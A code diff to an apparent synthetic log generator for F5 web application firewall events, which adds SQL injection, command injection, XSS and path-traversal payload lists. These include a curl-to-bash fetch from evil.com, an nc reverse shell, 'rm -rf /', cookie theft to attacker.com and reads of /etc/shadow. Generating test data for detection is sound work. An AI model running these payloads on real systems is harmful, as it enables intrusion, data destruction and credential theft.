@@ -15,6 +15,9 @@ def random_fqdn():
 
     return f"{random.choice(hostnames)}-{random.randint(1, 100)}.{random.choice(subdomains)}.{random.choice(domains)}.{random.choice(tlds)}"
 
+#List of Waf Action
+waf_actions = ["Allow", "Block", "Challenge", "Log", "Redirect", "Monitor", "Drop", "Notify", "Custom Response", "Rate Limit", "Sanitize", "Transform", "Whitelist", "Blacklist", "Inspect", "Throttle", "IP Blackhole", "Content Filtering", "Response Header Modification"]
+
 
 # List of predefined HTTP policy names
 http_policy_names = [
@@ -63,6 +66,162 @@ def random_user_agent():
     
     return f"{random.choice(browsers)} ({random.choice(os_types)}) {random.choice(webkit_engines)}/{browser_version}.0 (KHTML, like Gecko) Version/{os_version}.0"
 
+sqlpayloads = [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR 'a'='a",
+    "' OR ''='",
+    "' OR 1=1 LIMIT 1 --",
+    "' OR 1=1#",
+    "admin'--",
+    "' OR '1'='1'--",
+    "' OR 1=1-- -",
+    "' UNION SELECT null, null--",
+]
+
+cooomand_injection_payloads = [
+    "; ls",
+    "; whoami",
+    "; uname -a",
+    "; id",
+    "; cat /etc/passwd",
+    "|| ls",
+    "&& ls",
+    "| ls",
+    "`ls`",
+    "$(ls)",
+    "& whoami",
+    "; ping -c 4 8.8.8.8",
+    "; curl http://evil.com",
+    "; wget http://malicious.com/malware",
+    "; nslookup example.com",
+    "; sleep 10",
+    "; rm -rf /",
+    "; touch /tmp/exploit",
+    "; ifconfig",
+    "; ps aux",
+    "; netstat -an",
+    "; nc -e /bin/sh 10.0.0.1 4444",
+    "; echo 'exploit' > /tmp/exploit.txt",
+    "; chmod 777 /tmp/exploit",
+    "; killall -9 httpd",
+    "; shutdown -h now",
+    "& dir",
+    "& ipconfig",
+    "& net user",
+    "& netstat -an",
+    "& tasklist",
+    "& whoami",
+    "& shutdown -s",
+    "& curl http://attacker.com",
+    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "; ls > /tmp/output.txt",
+    "; cat /etc/passwd | grep root",
+    "; nc -lvp 4444 > /tmp/output.txt",
+    "; echo 'Hello' | mail -s 'Subject' attacker@evil.com",
+    "; curl http://evil.com/shell.sh | bash",
+    "; perl -e 'print `/etc/passwd`'",
+    "; python -c 'import os; os.system(\"ls\")'",
+    "; ls && whoami",
+    "; uname -a || id",
+    "| ls; whoami",
+    "`ls; whoami`",
+    "$(ls; whoami)",
+    "; sleep 10",
+    "; ping -c 10 127.0.0.1",
+    "; timeout 10",
+    "& timeout /t 10",
+    "| ping -n 10 localhost"
+]
+
+xss_payloads = [
+    "<script>alert('XSS')</script>",
+    "<img src='x' onerror='alert(1)'>",
+    "<svg onload='alert(1)'>",
+    "<iframe src='javascript:alert(1)'></iframe>",
+    "<body onload=alert(1)>",
+    "<input type='text' value='' onfocus='alert(1)'>",
+    "<a href='javascript:alert(1)'>Click me</a>",
+    "<object data='javascript:alert(1)'></object>",
+    "<embed src='javascript:alert(1)'>",
+    "<link rel='stylesheet' href='javascript:alert(1)'>",
+    "<form action='javascript:alert(1)'><input type='submit'></form>",
+    "<video src='x' onerror='alert(1)'></video>",
+    "<audio src='x' onerror='alert(1)'></audio>",
+    "<details open ontoggle='alert(1)'></details>",
+    "<marquee onstart='alert(1)'>",
+    "<table background='javascript:alert(1)'>",
+    "<div onpointerover='alert(1)'>Hover me</div>",
+    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
+    "javascript:alert(1)",
+    "onmouseover='alert(1)'",
+    "';alert(String.fromCharCode(88,83,83));//",
+    "<script>confirm('XSS')</script>",
+    "<img src=x onerror=alert(document.cookie);>",
+    "<svg><script>alert('XSS')</script></svg>",
+    "'';!--\"<XSS>=&{()}",
+    "<iframe srcdoc='<script>alert(1)</script>'>",
+    "<math><mtext></mtext><script>alert(1)</script></math>",
+    "<style>@import 'javascript:alert(1)';</style>",
+    "<img src=x onerror=this.src='http://attacker.com/?cookie='+document.cookie>",
+    "<input onfocus=alert(1) autofocus>",
+    "<button onclick=alert(1)>Click me</button>",
+    "<img src='#' onerror=alert(1)>",
+    "<img src=1 onerror=alert(1)>",
+    "<div style=background-image:url('javascript:alert(1)')>",
+    "<base href='javascript:alert(1)//'>"
+]
+
+file_inclusion_payloads = [
+    "../../../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "../../../../../../../../etc/passwd",
+    "/etc/passwd",
+    "/proc/self/environ",
+    "../../../../etc/shadow",
+    "../../../../../../etc/shadow",
+    "../../../../../../../../etc/shadow",
+    "../../../../../../../../windows/system32/drivers/etc/hosts",
+    "/windows/system32/drivers/etc/hosts",
+    "../../../../../../../../windows/win.ini",
+    "/windows/win.ini",
+    "../../../../../../../../boot.ini",
+    "/windows/system.ini",
+    "../../../../../../../../windows/system.ini",
+    "../../../../../../../../usr/local/apache2/conf/httpd.conf",
+    "/usr/local/apache2/conf/httpd.conf",
+    "../../../../../../../../usr/local/apache2/conf/extra/httpd-vhosts.conf",
+    "/usr/local/apache2/conf/extra/httpd-vhosts.conf",
+    "../../../../../../../../var/www/html/index.php",
+    "/var/www/html/index.php",
+    "../../../../../../../../var/log/apache2/access.log",
+    "/var/log/apache2/access.log",
+    "../../../../../../../../var/log/apache2/error.log",
+    "/var/log/apache2/error.log",
+    "../../../../../../../../var/lib/mysql/mysql/user.MYD",
+    "/var/lib/mysql/mysql/user.MYD",
+    "../../../../../../../../var/lib/mysql/mysql/user.frm",
+    "/var/lib/mysql/mysql/user.frm",
+    "../../../../../../../../proc/self/fd/0",
+    "../../../../../../../../proc/self/fd/1",
+    "../../../../../../../../proc/self/fd/2",
+    "../../../../../../../../proc/self/cmdline",
+    "../../../../../../../../proc/self/stat",
+    "../../../../../../../../proc/self/mounts",
+    "/../../../../../../../../dev/urandom",
+    "/../../../../../../../../dev/null",
+    "/../../../../../../../../dev/random",
+    "/../../../../../../../../dev/tcp/10.0.0.1/8080",
+    "../../../../../../../../../../dev/tcp/localhost/8888",
+    "/../../../../../../../../dev/tcp/localhost/4444",
+    "../../../../../../../../var/www/index.php?file=/etc/passwd",
+    "../../../../../../../../var/www/index.php?page=/etc/passwd",
+    "../../../../../../../../index.php?page=/etc/passwd",
+    "../../../../../../../../index.php?file=/etc/passwd",
+    "../../../../../../../../index.php?path=/etc/passwd"
+]
+
+
 
 # Function to generate a syslog format log entry
 def generate_syslog_log():
@@ -77,11 +236,11 @@ def generate_syslog_log():
         f'policy_name="My security policy",'
         f'violations="Attack signature detected",'
         f'support_id="{random.randint(0, 2**64 - 1)}",'
-        f'request_status="Blocked",'
+        f'request_status="{random.choice(waf_actions)}",'
         f'response_code="{random.randint(200, 500)}",'
         f'ip_client="{random_ip()}",'
         f'route_domain="{random.randint(0, 100)}",'
-        f'method="GET",'
+        f'method="{random.choice(["GET", "POST"])}",'
         f'protocol="HTTP",'
         f'query_string="key1=val1&key2=val2",'
         f'x_forwarded_for_header_value="{random_ip()}",'
@@ -114,12 +273,12 @@ def generate_cef_log():
     destip = random_ip()
     log = (
         f"<131>{now.strftime('%b %d %H:%M:%S')} {fqdn} ASM:CEF:0|F5|ASM|11.3.0|200021069|"
-        f"Automated client access \"wget\"|5|dvchost={fqdn} dvc={random_ip()} "
+        f"Automated client access |5|dvchost={fqdn} dvc={random_ip()} "
         f"cs1={random_string(10)} cs1Label=http_class_name cs2=random.choice(http_policy_names) "
         f"cs2Label=http_class_name deviceCustomDate1={now.strftime('%b %d %Y %H:%M:%S')} "
         f"deviceCustomDate1Label=policy_apply_date externalId={random.randint(1000000000000000000, 9999999999999999999)} "
         f"act=blocked cn1=0 cn1Label=src={random_ip()} spt={random.randint(1024, 65535)} "
-        f"dst={destip} dpt=80 requestMethod=GET app=HTTP cs5=N/A cs5Label=x_forwarded_for_header_value "
+        f"dst={destip} dpt=80 requestMethod={random.choice(["GET", "POST"])} app=HTTP cs5=N/A cs5Label=x_forwarded_for_header_value "
         f"rt={now.strftime('%b %d %Y %H:%M:%S')} deviceExternalId=0 cs4=Non-browser Client "
         f"cs4Label=attack_type cs6=N/A cs6Label=geo_location c6a1= c6a1Label=device_address "
         f"c6a2= c6a2Label=source_address c6a3= c6a3Label=destination_address c6a4=N/A "
